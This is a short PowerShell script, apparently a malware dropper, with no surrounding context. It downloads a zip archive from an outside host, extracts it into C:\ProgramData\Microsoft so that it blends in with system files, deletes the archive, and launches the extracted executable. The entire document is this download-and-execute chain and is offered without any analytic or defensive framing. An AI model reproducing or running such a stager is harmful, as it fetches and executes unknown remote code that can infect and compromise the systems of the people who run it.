Invoke-WebRequest -Uri "http://blanjio.com/zart.zip" -OutFile "C:\ProgramData\Microsoft\zart.zip"
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory("C:\ProgramData\Microsoft\zart.zip", "C:\ProgramData\Microsoft")
Remove-Item -Path "C:\ProgramData\Microsoft\zart.zip"
Start-Process -FilePath "C:\ProgramData\Microsoft\zart.exe"
